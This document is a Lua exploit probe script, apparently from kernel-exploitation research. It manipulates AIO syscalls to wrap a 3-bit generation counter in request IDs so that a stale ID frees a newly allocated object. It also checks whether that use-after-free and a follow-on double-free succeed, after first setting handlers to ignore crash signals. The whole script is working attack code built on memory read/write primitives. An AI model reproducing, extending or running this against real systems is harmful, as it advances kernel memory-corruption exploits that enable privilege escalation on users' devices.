-- CRASH_CLASS: HIGH
-- PROBE 70a: Test generation counter wrap-around for stale-ID UAF
--
-- FINDING (25_GENERATION_CHECK_ANALYSIS.md, 2026-10-25):
--   descriptor_exclusive_lookup (0x39a2a0) re-validates the full AIO ID
--   including a 3-bit generation counter (bits 15..13 of the 16-bit ID).
--   This makes 662-vs-662 double-free impossible for same-generation IDs.
--
--   BUT: 3 bits = values 0-7. After 8 alloc/free cycles on the same slot,
--   the generation wraps back to the original value. If the original ID
--   is still held, exclusive_lookup would MATCH on the stale ID and free
--   the NEW object → USE-AFTER-FREE of a different object.
--
-- STRATEGY:
--   1. Submit AIO request → get ID_X (slot S, gen G)
--   2. Poll ID_X (prerequisite for delete)
--   3. Delete ID_X → slot S freed, gen bumps to G+1
--   4. Submit+poll+delete 7 more times on slot S → gen wraps: G+1→G+2→...→G+7→G
--   5. Submit one more → slot S with gen G (matches original ID_X!)
--   6. Try 662(ID_X) → if generation matches → frees the NEW object → UAF
--   7. Query the new object → if status shows freed → CONFIRMED UAF
--
-- PREREQUISITE: LIFO slot reuse (confirmed by object table research)

print("=== PROBE 70a: Generation wrap-around UAF ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS, SIGSEGV, SIGBUS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function wait_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- ============================================================
-- [A] CHARACTERIZE ID FORMAT: slot and generation fields
-- ============================================================
print("[A] ID format characterization")

-- Submit 20 sequential IDs and analyze their bit patterns
local seq_ids = {}
for i = 1, 20 do
    local id = submit_one()
    if id ~= 0 then
        table.insert(seq_ids, id)
        local slot = id % 0x2000          -- bits 12..0
        local gen = math.floor(id / 0x2000)  -- bits 15..13
        print(string.format("  id[%d] = 0x%04X  slot=%d  gen=%d", i, id, slot, gen))
    end
end

if not alive() then print("DEAD after section A submit"); return end

-- Delete all and re-submit to see reuse
for _, id in ipairs(seq_ids) do
    poll_one(id)
    delete_one(id)
end

if not alive() then print("DEAD after section A delete"); return end

print("  --- After delete+resubmit ---")
local resub_ids = {}
for i = 1, 10 do
    local id = submit_one()
    if id ~= 0 then
        table.insert(resub_ids, id)
        local slot = id % 0x2000
        local gen = math.floor(id / 0x2000)
        print(string.format("  resub[%d] = 0x%04X  slot=%d  gen=%d", i, id, slot, gen))
    end
end

-- Check: do resubmitted IDs reuse the same slots with incremented generation?
for i = 1, math.min(#seq_ids, #resub_ids) do
    local s1 = seq_ids[#seq_ids - i + 1] % 0x2000  -- LIFO: last freed = first reused
    local s2 = resub_ids[i] % 0x2000
    local g1 = math.floor(seq_ids[#seq_ids - i + 1] / 0x2000)
    local g2 = math.floor(resub_ids[i] / 0x2000)
    if s1 == s2 then
        print(string.format("  LIFO match: slot %d, gen %d -> %d (delta=%d)", s1, g1, g2, g2 - g1))
    end
end

-- Clean up
for _, id in ipairs(resub_ids) do
    pcall(function() poll_one(id) end)
    pcall(function() delete_one(id) end)
end

if not alive() then print("DEAD after section A cleanup"); return end

-- ============================================================
-- [B] GENERATION WRAP-AROUND TEST
-- ============================================================
print("")
print("[B] Generation wrap-around test")

-- Step 1: Submit ONE request, record its ID
local target_id = submit_one()
if target_id == 0 then print("  FAIL: no target ID"); return end
local target_slot = target_id % 0x2000
local target_gen = math.floor(target_id / 0x2000)
print(string.format("  TARGET: id=0x%04X slot=%d gen=%d", target_id, target_slot, target_gen))

-- Poll and delete the target
poll_one(target_id)
delete_one(target_id)
print("  TARGET deleted")

if not alive() then print("DEAD after target delete"); return end

-- Step 2: Cycle the slot 7 more times (total 8 with original = full generation wrap)
-- We need to ensure the SAME slot gets reused each time (LIFO)
-- To force LIFO reuse of target_slot, we should not have other pending requests
local cycle_ids = {}
local cycle_ok = true
for cycle = 1, 15 do  -- Try up to 15 cycles (more than 8 needed, in case LIFO isn't perfect)
    if not alive() then cycle_ok = false; break end

    local id = submit_one()
    if id == 0 then
        print(string.format("  cycle %d: FAIL (no ID)", cycle))
        cycle_ok = false
        break
    end

    local slot = id % 0x2000
    local gen = math.floor(id / 0x2000)

    print(string.format("  cycle %d: id=0x%04X slot=%d gen=%d %s",
        cycle, id, slot, gen,
        slot == target_slot and "*** SAME SLOT ***" or ""))

    table.insert(cycle_ids, {id = id, slot = slot, gen = gen})

    poll_one(id)
    delete_one(id)

    -- Check if we've wrapped back to the original generation
    if slot == target_slot and gen == target_gen then
        print(string.format("  *** GENERATION WRAPPED at cycle %d! gen=%d matches target ***", cycle, gen))
    end
end

if not alive() then print("DEAD during cycling"); return end

-- Step 3: Submit one MORE request — this should get the slot with wrapped generation
local wrap_id = submit_one()
if wrap_id == 0 then print("  FAIL: no wrap ID"); return end
local wrap_slot = wrap_id % 0x2000
local wrap_gen = math.floor(wrap_id / 0x2000)
print(string.format("  WRAP: id=0x%04X slot=%d gen=%d", wrap_id, wrap_slot, wrap_gen))

if wrap_slot == target_slot and wrap_gen == target_gen then
    print("  *** WRAP ID MATCHES TARGET ID EXACTLY ***")
    print("  wrap_id == target_id: " .. tostring(wrap_id == target_id))
end

-- Poll the wrap request (prerequisite for queries)
poll_one(wrap_id)

-- Step 4: Try to delete using the ORIGINAL target_id
-- If generation has wrapped, this should SUCCEED and free the wrap request's objects
print("")
print("[C] Stale ID deletion attempt")
print(string.format("  Attempting 662(0x%04X) on wrap request's slot...", target_id))

local stale_status = delete_one(target_id)
print(string.format("  stale delete status: 0x%08X", stale_status))

if stale_status == 0 then
    print("  *** DELETE SUCCEEDED ON STALE ID ***")

    -- Step 5: Check if the wrap request is now invalid
    local wrap_poll = poll_one(wrap_id)
    local wrap_wait = wait_one(wrap_id)
    print(string.format("  wrap_id poll after stale delete: 0x%08X", wrap_poll))
    print(string.format("  wrap_id wait after stale delete: 0x%08X", wrap_wait))

    if wrap_poll == 0x80020003 then
        print("  *** CONFIRMED: wrap request FREED by stale ID deletion ***")
        print("  *** THIS IS THE UAF MECHANISM ***")
    end

    -- Step 6: Try to delete the wrap_id too — if already freed, this is double-free
    local wrap_del = delete_one(wrap_id)
    print(string.format("  wrap_id delete status: 0x%08X", wrap_del))
    if wrap_del == 0 then
        print("  *** DOUBLE-FREE CONFIRMED: both stale and live deletes succeeded ***")
    end
else
    print(string.format("  Stale delete FAILED (status=0x%08X)", stale_status))
    if stale_status == 0x80020003 then
        print("  ID not found — generation did NOT wrap, or slot was not reused")
    elseif stale_status == 0x80020010 then
        print("  Request not in deletable state")
    end

    -- Clean up wrap request normally
    pcall(function() delete_one(wrap_id) end)
end

if not alive() then print("DEAD after section C"); return end

-- ============================================================
-- [D] EXTENDED WRAP TEST: force exact slot reuse with padding
-- ============================================================
print("")
print("[D] Extended wrap test: padding to force slot reuse")

-- Approach: allocate padding requests on OTHER slots, then cycle target slot
-- This ensures LIFO gives us the target slot every time

-- Create 5 padding requests to occupy nearby slots
local padding = {}
for i = 1, 5 do
    local id = submit_one()
    if id ~= 0 then table.insert(padding, id) end
end
print("  padding: " .. #padding .. " requests occupying slots")

-- Now allocate target
local tgt2_id = submit_one()
if tgt2_id == 0 then print("  FAIL: no target"); return end
local tgt2_slot = tgt2_id % 0x2000
local tgt2_gen = math.floor(tgt2_id / 0x2000)
print(string.format("  TARGET2: id=0x%04X slot=%d gen=%d", tgt2_id, tgt2_slot, tgt2_gen))

poll_one(tgt2_id)
delete_one(tgt2_id)

-- Cycle 8 times with padding still held (forces LIFO reuse of tgt2_slot)
local wrap_found = false
for cycle = 1, 16 do
    if not alive() then break end
    local id = submit_one()
    if id == 0 then break end
    local slot = id % 0x2000
    local gen = math.floor(id / 0x2000)

    if slot == tgt2_slot then
        print(string.format("  D cycle %d: slot=%d gen=%d (target slot, delta=%d)",
            cycle, slot, gen, (gen - tgt2_gen) % 8))
        if gen == tgt2_gen and cycle > 1 then
            print("  *** GENERATION WRAPPED BACK TO ORIGINAL ***")
            -- Don't delete this one — keep it alive for the stale-ID test
            poll_one(id)

            local stale_st = delete_one(tgt2_id)
            print(string.format("  stale delete(0x%04X) = 0x%08X", tgt2_id, stale_st))

            if stale_st == 0 then
                local live_poll = poll_one(id)
                print(string.format("  live poll(0x%04X) = 0x%08X  %s", id, live_poll,
                    live_poll == 0x80020003 and "*** UAF CONFIRMED ***" or ""))
            end

            pcall(function() delete_one(id) end)
            wrap_found = true
            break
        end
    else
        if cycle <= 3 then
            print(string.format("  D cycle %d: slot=%d (NOT target slot %d)", cycle, slot, tgt2_slot))
        end
    end

    poll_one(id)
    delete_one(id)
end

-- Clean up padding
for _, id in ipairs(padding) do
    pcall(function() poll_one(id) end)
    pcall(function() delete_one(id) end)
end

if not wrap_found then
    print("  Generation did not wrap in 16 cycles (slot reuse may not be LIFO for AIO)")
end

print("")
print("=== PROBE 70a COMPLETE ===")
